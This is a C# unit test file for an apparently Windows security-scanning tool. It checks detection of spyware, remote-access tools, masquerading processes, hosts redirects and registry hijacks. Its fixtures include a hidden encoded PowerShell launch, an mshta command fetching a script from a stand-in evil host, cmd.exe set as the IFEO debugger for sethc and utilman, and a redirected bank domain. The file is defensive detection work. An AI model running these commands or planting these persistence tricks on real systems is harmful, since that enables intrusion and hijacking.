using PcCheck.Core.Analysis;
using PcCheck.Core.Localization;
using PcCheck.Core.Models;

namespace PcCheck.Core.Tests;

public sealed class SecurityTests
{
    private static readonly PathContext Ctx = new(
        @"C:\Windows", @"C:\Program Files", @"C:\Program Files (x86)", @"C:\ProgramData", @"C:\Users", @"C:\Users\an\AppData\Local\Temp");

    private static FileTrust File(string path, bool? signed, PathKind? kind = null) =>
        new(path, true, signed, signed == true ? "Signer Co" : "", "", kind ?? SecurityCatalog.Classify(path, Ctx));

    // ===== Danh mục =====

    [Theory]
    [InlineData("TeamViewer 15", "teamviewer")]
    [InlineData("AnyDesk", "anydesk")]
    [InlineData("UltraViewer version 6.6", "ultraviewer")]
    [InlineData("Spyrix Free Keylogger", "spyrix")]
    [InlineData("Refog Personal Monitor", "refog")]
    public void ProgramsAreMatched(string name, string key) => Assert.Equal(key, SecurityCatalog.MatchProgram(name)?.Key);

    [Theory]
    [InlineData("Network Inspector Tool")]
    [InlineData("Microsoft Edge")]
    [InlineData("TeamViewerish Utility")]
    public void SimilarNamesAreNotMatched(string name) => Assert.Null(SecurityCatalog.MatchProgram(name));

    [Fact]
    public void ProcessesAndServicesAreMatched()
    {
        Assert.Equal("anydesk", SecurityCatalog.MatchProcess("AnyDesk.exe")?.Key);
        Assert.Equal("ultraviewer", SecurityCatalog.MatchProcess("UltraViewer_Desktop")?.Key);
        Assert.Equal("chrome_remote", SecurityCatalog.MatchService("chromoting", "Chrome Remote Desktop Service", "")?.Key);
        Assert.Equal("netsupport", SecurityCatalog.MatchService("Client32", "", @"""C:\Program Files\NetSupport\client32.exe""")?.Key);
        Assert.Null(SecurityCatalog.MatchProcess("chrome.exe"));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\svchost.exe", PathKind.Windows)]
    [InlineData(@"C:\Program Files (x86)\App\a.exe", PathKind.ProgramFiles)]
    [InlineData(@"C:\ProgramData\x\a.exe", PathKind.ProgramData)]
    [InlineData(@"C:\Users\an\AppData\Roaming\a.exe", PathKind.UserProfile)]
    [InlineData(@"C:\Users\an\AppData\Local\Temp\x\a.exe", PathKind.Temp)]
    [InlineData(@"D:\Tools\a.exe", PathKind.Other)]
    [InlineData("", PathKind.Unknown)]
    public void PathsAreClassified(string path, PathKind kind) => Assert.Equal(kind, SecurityCatalog.Classify(path, Ctx));

    [Fact]
    public void CommandsAreAnalysed()
    {
        var encoded = SecurityCatalog.AnalyzeCommand("powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA");
        Assert.True(encoded.HasFlag(CommandFlags.ScriptHost));
        Assert.True(encoded.HasFlag(CommandFlags.EncodedCommand));
        Assert.True(encoded.HasFlag(CommandFlags.HiddenWindow));

        var download = SecurityCatalog.AnalyzeCommand(@"mshta.exe http://evil.example/a.hta");
        Assert.True(download.HasFlag(CommandFlags.LolBin));
        Assert.True(download.HasFlag(CommandFlags.Downloads));

        Assert.Equal(CommandFlags.None, SecurityCatalog.AnalyzeCommand(@"""C:\Program Files\App\app.exe"" --minimized"));
        Assert.Equal(@"C:\Users\an\AppData\Roaming\x.vbs", SecurityCatalog.ScriptPathOf(@"wscript.exe //B ""C:\Users\an\AppData\Roaming\x.vbs"""));
        Assert.Equal(@"C:\Program Files\App\app.exe", SecurityCatalog.ExecutableOf(@"C:\Program Files\App\app.exe --tray"));
    }

    [Fact]
    public void MasqueradeAndLookalikeNamesAreDetected()
    {
        Assert.True(SecurityCatalog.IsMasquerade("svchost.exe", @"C:\Users\an\AppData\Roaming\svchost.exe", Ctx));
        Assert.False(SecurityCatalog.IsMasquerade("svchost.exe", @"C:\Windows\System32\svchost.exe", Ctx));
        Assert.False(SecurityCatalog.IsMasquerade("explorer.exe", @"C:\Windows\explorer.exe", Ctx));
        Assert.True(SecurityCatalog.IsMasquerade("explorer.exe", @"C:\ProgramData\explorer.exe", Ctx));

        Assert.True(SecurityCatalog.IsLookalike("scvhost.exe"));
        Assert.True(SecurityCatalog.IsLookalike("lsasss.exe"));
        Assert.False(SecurityCatalog.IsLookalike("svchost.exe"));
        Assert.False(SecurityCatalog.IsLookalike("notepad.exe"));
    }

    [Fact]
    public void HostsEntriesAreParsedAndClassified()
    {
        var entries = SecurityCatalog.ParseHosts(
        [
            "# comment",
            "127.0.0.1 localhost",
            "::1 localhost",
            "10.1.2.3 vietcombank.com.vn www.vietcombank.com.vn # fake",
            "0.0.0.0 download.windowsupdate.com",
            "192.168.1.5 nas.local",
        ]);

        Assert.Equal(4, entries.Count);
        Assert.Equal(SecurityCatalog.HostsVerdict.Redirect, SecurityCatalog.ClassifyHosts(entries[0]));
        Assert.Equal(SecurityCatalog.HostsVerdict.Redirect, SecurityCatalog.ClassifyHosts(entries[1]));
        Assert.Equal(SecurityCatalog.HostsVerdict.BlocksSecurity, SecurityCatalog.ClassifyHosts(entries[2]));
        Assert.Equal(SecurityCatalog.HostsVerdict.Normal, SecurityCatalog.ClassifyHosts(entries[3]));
    }

    [Theory]
    [InlineData("8.8.8.8", true)]
    [InlineData("2606:4700:4700::1111", true)]
    [InlineData("192.168.1.10", false)]
    [InlineData("10.0.0.1", false)]
    [InlineData("172.20.1.1", false)]
    [InlineData("127.0.0.1", false)]
    [InlineData("::1", false)]
    [InlineData("fe80::1", false)]
    [InlineData("not-an-ip", false)]
    public void PublicAddressesAreRecognised(string address, bool isPublic) => Assert.Equal(isPublic, SecurityCatalog.IsPublicAddress(address));

    [Fact]
    public void RiskyExtensionPermissionsAreListed()
    {
        Assert.Equal(["all_sites", "debugger", "clipboard"], SecurityCatalog.RiskyPermissions(["<all_urls>", "debugger", "clipboardRead", "storage"]));
        Assert.Empty(SecurityCatalog.RiskyPermissions(["storage", "alarms", "https://example.com/*"]));
    }

    [Theory]
    [InlineData(HijackKind.IfeoDebugger, "sethc.exe", @"C:\Windows\System32\cmd.exe", Severity.Critical)]
    [InlineData(HijackKind.IfeoDebugger, "taskmgr.exe", @"C:\Tools\procexp64.exe /e", Severity.Info)]
    [InlineData(HijackKind.IfeoDebugger, "notepad.exe", @"C:\Tools\np++.exe", Severity.Warning)]
    [InlineData(HijackKind.WinlogonShell, "Shell", "explorer.exe", Severity.Ok)]
    [InlineData(HijackKind.WinlogonShell, "Shell", @"explorer.exe, C:\Users\an\AppData\x.exe", Severity.Critical)]
    [InlineData(HijackKind.WinlogonUserinit, "Userinit", @"C:\Windows\system32\userinit.exe,", Severity.Ok)]
    [InlineData(HijackKind.WinlogonUserinit, "Userinit", @"C:\Windows\system32\userinit.exe,C:\ProgramData\x.exe", Severity.Critical)]
    [InlineData(HijackKind.AppInitDlls, "AppInit_DLLs", @"C:\ProgramData\hook.dll", Severity.Warning)]
    public void HijacksAreClassified(HijackKind kind, string target, string value, Severity expected) =>
        Assert.Equal(expected, SecurityCatalog.ClassifyHijack(new HijackEntry(kind, target, value, "HKLM")));

    [Theory]
    [InlineData(@"C:\", true)]
    [InlineData(@"C:\Users\an\AppData\Roaming", true)]
    [InlineData(@"C:\Users\an\Downloads", true)]
    [InlineData(@"C:\ProgramData", true)]
    [InlineData(".exe", true)]
    [InlineData("powershell.exe", true)]
    [InlineData(@"C:\Program Files\Steam", false)]
    [InlineData(@"D:\Games", false)]
    [InlineData(".iso", false)]
    public void RiskyExclusionsAreDetected(string value, bool risky) => Assert.Equal(risky, SecurityCatalog.IsRiskyExclusion(value, Ctx));

    // ===== Phân tích =====

    private static ScanData Clean()
    {
        var data = TestData.HealthyPc();
        data.Security = new SecurityData
        {
            Collected = true,
            Defender = new DefenderInfo { Available = true, AntivirusEnabled = true, RealTimeEnabled = true, TamperProtected = true, QuickScanAgeDays = 2, ExclusionsReadable = true, RunningMode = "Normal" },
            Processes =
            [
                new ProcessEntry { Pid = 100, Name = "chrome.exe", File = File(@"C:\Program Files\Google\Chrome\Application\chrome.exe", true) },
                new ProcessEntry { Pid = 200, Name = "svchost.exe", File = File(@"C:\Windows\System32\svchost.exe", null) },
            ],
            Autostart =
            [
                new AutostartEntry { Source = AutostartSource.RunKey, Name = "OneDrive", Command = @"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background", Target = File(@"C:\Program Files\Microsoft OneDrive\OneDrive.exe", true) },
            ],
            Connections = [new ConnectionEntry(100, "192.168.1.2", 50000, "142.250.66.78", 443, false, false)],
            Accounts = [new LocalAccount { Name = "an", Sid = "S-1-5-21-1-2-3-1001", Enabled = true, IsAdmin = true }],
            Exposure = new RemoteExposure { RdpEnabled = false, Smb1Enabled = false, SmartScreenOff = false, BitLockerOn = true },
        };
        return data;
    }

    private static SecurityReport Report(ScanData data) => SecurityAnalyzer.Analyze(data, TestData.Now);

    [Fact]
    public void CleanPcHasNoWarnings()
    {
        var report = Report(Clean());
        Assert.True(report.Collected);
        var flagged = report.Items.Where(i => i.Severity >= Severity.Warning).Select(i => i.Id).ToList();
        Assert.True(flagged.Count == 0, string.Join(", ", flagged));
        Assert.Contains(report.Items, i => i.Id == "secure/defender/ok");
        Assert.Empty(SecurityAnalyzer.ToIssues(report));
    }

    [Fact]
    public void NotCollectedGivesEmptyReport()
    {
        var data = TestData.HealthyPc();
        Assert.False(Report(data).Collected);
        Assert.DoesNotContain(Analyzer.Analyze(data, TestData.Now).Issues, i => i.Category == IssueCategory.Security && i.Id.StartsWith("secure/", StringComparison.Ordinal));
    }

    [Fact]
    public void SpywareAndRemoteToolsAreReported()
    {
        var data = Clean();
        data.Programs.Add(new InstalledProgram { Id = "spyrix", Name = "Spyrix Personal Monitor", InstallLocation = @"C:\ProgramData\Spyrix" });
        data.Security.Processes.Add(new ProcessEntry { Pid = 300, Name = "AnyDesk.exe", File = File(@"C:\Program Files (x86)\AnyDesk\AnyDesk.exe", true) });
        data.Security.Connections.Add(new ConnectionEntry(300, "192.168.1.2", 50001, "91.21.1.10", 443, false, false));

        var report = Report(data);

        var spy = Assert.Single(report.Items, i => i.Id == "secure/sec_spyware/spyrix");
        Assert.Equal(Severity.Critical, spy.Severity);
        Assert.Contains(spy.Actions, a => a.Kind == SecurityActionKind.Uninstall && a.Arg == "spyrix");
        var remote = Assert.Single(report.Items, i => i.Id == "secure/sec_remote/anydesk");
        Assert.Equal(Severity.Warning, remote.Severity);
        Assert.Contains(remote.Tags, t => t.Key == "sec.tag.connected");

        var issues = SecurityAnalyzer.ToIssues(report).ToList();
        Assert.Contains(issues, i => i.Id == "secure/sec_spyware/spyrix" && i.Category == IssueCategory.Security);
        Assert.All(issues, i => Assert.NotNull(IssueGuides.Find(i.Id)));
    }

    [Fact]
    public void InstalledButIdleRemoteToolIsOnlyInfo()
    {
        var data = Clean();
        data.Programs.Add(new InstalledProgram { Id = "tv", Name = "TeamViewer" });
        Assert.Equal(Severity.Info, Assert.Single(Report(data).Items, i => i.Id == "secure/sec_remote/teamviewer").Severity);
    }

    [Fact]
    public void SuspiciousAutostartIsRated()
    {
        var encoded = new AutostartEntry
        {
            Source = AutostartSource.ScheduledTask,
            Name = "Updater",
            Command = "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            Flags = CommandFlags.ScriptHost | CommandFlags.EncodedCommand | CommandFlags.HiddenWindow,
            Target = File(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", null),
            ActionId = @"\Updater",
        };
        Assert.Equal((Severity.Critical, "encoded"), SecurityAnalyzer.RateAutostart(encoded));

        var unsigned = new AutostartEntry { Name = "x", Target = File(@"C:\Users\an\AppData\Roaming\x\x.exe", false) };
        Assert.Equal((Severity.Warning, "unsigned_user"), SecurityAnalyzer.RateAutostart(unsigned));

        unsigned.Enabled = false;
        Assert.Equal(Severity.Info, SecurityAnalyzer.RateAutostart(unsigned).Severity);

        var missing = new AutostartEntry { Name = "old", Target = new FileTrust(@"C:\Program Files\Old\old.exe", false, null, "", "", PathKind.ProgramFiles) };
        Assert.Equal((Severity.Info, "missing"), SecurityAnalyzer.RateAutostart(missing));

        var data = Clean();
        data.Security.Autostart.Add(encoded);
        var item = Assert.Single(Report(data).Items, i => i.Section == SecuritySectionKind.Autostart && i.Severity == Severity.Critical);
        Assert.Contains(item.Actions, a => a.Kind == SecurityActionKind.DisableTask && a.Arg == @"\Updater");
    }

    [Fact]
    public void SystemLevelThreatsAreCritical()
    {
        var data = Clean();
        data.Security.Processes.Add(new ProcessEntry { Pid = 400, Name = "svchost.exe", File = File(@"C:\Users\an\AppData\Roaming\svchost.exe", false) });
        data.Security.Hosts.Add(new HostsEntry("10.1.2.3", "www.facebook.com", 22));
        data.Security.Accounts.Add(new LocalAccount { Name = "support", Sid = "S-1-5-21-1-2-3-1002", Enabled = true, IsAdmin = true, HiddenFromLogon = true });
        data.Security.Defender.Threats.Add(new ThreatEntry("Trojan:Win32/Agent", 5, TestData.Now.AddDays(-1), [@"C:\Users\an\Downloads\crack.exe"], true));
        data.Security.Hijacks.Add(new HijackEntry(HijackKind.IfeoDebugger, "utilman.exe", @"C:\Windows\System32\cmd.exe", "HKLM\\IFEO\\utilman.exe"));

        var critical = Report(data).Items.Where(i => i.Severity == Severity.Critical).Select(i => i.Section).ToList();

        Assert.Contains(SecuritySectionKind.Processes, critical);
        Assert.Contains(SecuritySectionKind.Certificates, critical);
        Assert.Contains(SecuritySectionKind.Access, critical);
        Assert.Contains(SecuritySectionKind.Defender, critical);
        Assert.Contains(SecuritySectionKind.System, critical);
    }

    [Fact]
    public void ItemsCoveredElsewhereDoNotCreateIssues()
    {
        var data = Clean();
        data.Security.Defender.RealTimeEnabled = false;
        data.Security.Exposure.RdpEnabled = true;

        var report = Report(data);
        var issues = SecurityAnalyzer.ToIssues(report).ToList();

        Assert.Contains(report.Items, i => i.Id == "secure/defender/realtime" && i.NoIssue);
        Assert.DoesNotContain(issues, i => i.Id == "secure/defender/realtime");
        Assert.Contains(issues, i => i.Id == "secure/sec_rdp/on");
    }

    /// <summary>Dữ liệu chạm tới hầu hết nhánh phân tích, để kiểm tra mọi chuỗi đều đã được dịch.</summary>
    private static ScanData Everything()
    {
        var data = Clean();
        var s = data.Security;
        data.Programs.Add(new InstalledProgram { Id = "a", Name = "Spyrix" });
        data.Programs.Add(new InstalledProgram { Id = "b", Name = "Hubstaff" });
        data.Programs.Add(new InstalledProgram { Id = "c", Name = "UltraViewer" });
        s.Processes.Add(new ProcessEntry { Pid = 500, Name = "scvhost.exe", File = File(@"C:\Users\an\AppData\Local\Temp\scvhost.exe", false) });
        s.Processes.Add(new ProcessEntry { Pid = 501, Name = "tool.exe", File = File(@"C:\Users\an\AppData\Roaming\tool.exe", false) });
        s.Processes.Add(new ProcessEntry { Pid = 502, Name = "svc.exe", File = File(@"C:\Users\an\Desktop\svc.exe", false) });
        s.Connections.Add(new ConnectionEntry(501, "0.0.0.0", 5900, "0.0.0.0", 0, true, false));
        s.Connections.Add(new ConnectionEntry(502, "192.168.1.2", 50010, "1.2.3.4", 8080, false, false));
        foreach (var flags in new[] { CommandFlags.ScriptHost | CommandFlags.Downloads, CommandFlags.ScriptHost | CommandFlags.HiddenWindow })
            s.Autostart.Add(new AutostartEntry { Source = AutostartSource.RunOnce, Name = flags.ToString(), Command = "cmd /c " + flags, Flags = flags });
        s.Autostart.Add(new AutostartEntry { Source = AutostartSource.StartupFolder, Name = "t", ActionId = "4|t.lnk", Target = File(@"C:\Users\an\AppData\Local\Temp\t.exe", false) });
        s.Autostart.Add(new AutostartEntry { Source = AutostartSource.Service, Name = "u", Target = File(@"D:\Apps\u.exe", false) });
        s.DeviceAccess.Add(new DeviceAccessEntry { Capability = "webcam", App = @"C:\Users\an\AppData\Roaming\cam.exe", LastStart = TestData.Now.AddHours(-1), File = File(@"C:\Users\an\AppData\Roaming\cam.exe", false) });
        s.DeviceAccess.Add(new DeviceAccessEntry { Capability = "microphone", App = "Microsoft.SkypeApp_kzf8qxf38zg5c", Packaged = true, LastStart = TestData.Now.AddDays(-3), LastStop = TestData.Now.AddDays(-3) });
        s.DeviceAccess.Add(new DeviceAccessEntry { Capability = "location", App = "Microsoft.WindowsMaps_8wekyb3d8bbwe", Packaged = true, LastStart = TestData.Now.AddDays(-2), LastStop = TestData.Now.AddDays(-2) });
        s.Proxy = new ProxyInfo { Enabled = true, Server = "10.0.0.5:3128", AutoConfigUrl = "http://wpad.example/proxy.pac" };
        s.BrowserPolicies.Add(new BrowserPolicy("Chrome", "ProxyServer", "1.2.3.4:8080", "HKLM"));
        s.BrowserPolicies.Add(new BrowserPolicy("Chrome", "HomepageLocation", "http://x", "HKLM"));
        s.Extensions.Add(new BrowserExtension { Browser = "Chrome", Profile = "Default", Id = new string('a', 32), Name = "Helper", Version = "1.0", ForceInstalled = true, Permissions = ["<all_urls>", "debugger", "proxy", "nativeMessaging", "tabCapture", "clipboardRead", "history", "cookies", "management", "webRequestBlocking"] });
        s.Extensions.Add(new BrowserExtension { Browser = "Edge", Profile = "Default", Id = new string('b', 32), Name = "Plain", Version = "2.0" });
        s.AddedRootCertificates.Add(new CertificateEntry("Evil Root CA", "Evil Root CA", "ABC", TestData.Now.AddYears(5), "LocalMachine"));
        s.AddedRootCertificates.Add(new CertificateEntry("Kaspersky Anti-Virus Personal Root", "Kaspersky", "DEF", TestData.Now.AddYears(5), "CurrentUser"));
        s.Hosts.Add(new HostsEntry("0.0.0.0", "update.microsoft.com", 3));
        s.Hosts.Add(new HostsEntry("192.168.1.9", "printer.lan", 4));
        s.Hosts.Add(new HostsEntry("6.6.6.6", "google.com", 5));
        s.Defender.Threats.Add(new ThreatEntry("Old:Threat", 1, TestData.Now.AddDays(-20), [], false));
        s.Defender.ExclusionPaths.Add(@"C:\Users\an\AppData\Roaming");
        s.Defender.ExclusionProcesses.Add("game.exe");
        s.Defender.ExclusionExtensions.Add("iso");
        s.Defender.TamperProtected = false;
        s.Defender.QuickScanAgeDays = null;
        s.Exposure = new RemoteExposure
        {
            RdpEnabled = true, RemoteRegistryRunning = true, TelnetRunning = true, WinRmRunning = true, SshServerRunning = true,
            Smb1Enabled = true, AutoLogonWithPassword = true, SmartScreenOff = true, BitLockerOn = false,
        };
        s.Accounts.Add(new LocalAccount { Name = "Administrator", Sid = "S-1-5-21-1-2-3-500", Enabled = true, IsAdmin = true });
        s.Accounts.Add(new LocalAccount { Name = "Guest", Sid = "S-1-5-21-1-2-3-501", Enabled = true });
        s.Accounts.Add(new LocalAccount { Name = "helper", Sid = "S-1-5-21-1-2-3-1005", Enabled = true, HiddenFromLogon = true });
        s.Management = new ManagementInfo { DomainJoined = true, Domain = "CORP", MdmEnrolled = true, MdmAccount = "an@corp.example" };
        s.Hijacks.Add(new HijackEntry(HijackKind.WinlogonShell, "Shell", "evil.exe", "HKCU\\Winlogon"));
        s.Hijacks.Add(new HijackEntry(HijackKind.WinlogonUserinit, "Userinit", "x.exe", "HKLM\\Winlogon"));
        s.Hijacks.Add(new HijackEntry(HijackKind.AppInitDlls, "AppInit_DLLs", "hook.dll", "HKLM\\Windows"));
        data.System.FirewallKnown = true;
        data.System.FirewallDisabledProfiles.Add("Public");
        data.System.UacEnabled = false;
        data.Hardware.Firmware.SecureBootEnabled = false;
        return data;
    }

    [Fact]
    public void EveryReportTextResolvesInBothLanguages()
    {
        var report = Report(Everything());
        Assert.Contains(report.Items, i => i.Severity == Severity.Critical);
        Assert.True(report.Items.Select(i => i.Section).Distinct().Count() == Enum.GetValues<SecuritySectionKind>().Length,
            "Thiếu nhóm: " + string.Join(", ", Enum.GetValues<SecuritySectionKind>().Except(report.Items.Select(i => i.Section))));

        foreach (var language in Loc.SupportedLanguages)
        {
            Loc.Instance.SetLanguage(language);
            foreach (var item in report.Items)
            {
                var texts = new List<LocText> { item.Title };
                if (item.Detail is { } detail) texts.Add(detail);
                texts.AddRange(item.Tags);
                texts.AddRange(item.Actions.Select(a => a.Label));
                foreach (var text in texts)
                {
                    var s = text.ToString();
                    Assert.False(s == text.Key, $"Chưa dịch: {text.Key} ({item.Id})");
                    Assert.DoesNotContain("{0", s, StringComparison.Ordinal);
                }

                if (item.GuideKey is { } key)
                {
                    Assert.Contains(key, IssueGuides.SecurityKeys);
                    Assert.NotEqual($"guide.{key}.steps", IssueGuides.ForKey(key).Steps.ToString());
                }
            }

            foreach (var kind in Enum.GetValues<SecuritySectionKind>())
            {
                var key = "sec.section." + kind.ToString().ToLowerInvariant();
                Assert.NotEqual(key, Loc.T(key));
                Assert.NotEqual(key + "_desc", Loc.T(key + "_desc"));
            }
        }

        Loc.Instance.SetLanguage(Loc.Vietnamese);
    }

    [Fact]
    public void IssueCountIsCapped()
    {
        var issues = SecurityAnalyzer.ToIssues(Report(Everything())).ToList();
        Assert.InRange(issues.Count, 1, 25);
        Assert.Equal(issues.OrderByDescending(i => i.Severity).Select(i => i.Id), issues.Select(i => i.Id));
    }

    [Fact]
    public void StableHashIsDeterministic()
    {
        Assert.Equal(SecurityAnalyzer.StableHash(@"C:\A\b.exe"), SecurityAnalyzer.StableHash(@"c:\a\B.EXE"));
        Assert.NotEqual(SecurityAnalyzer.StableHash("a"), SecurityAnalyzer.StableHash("b"));
    }
}
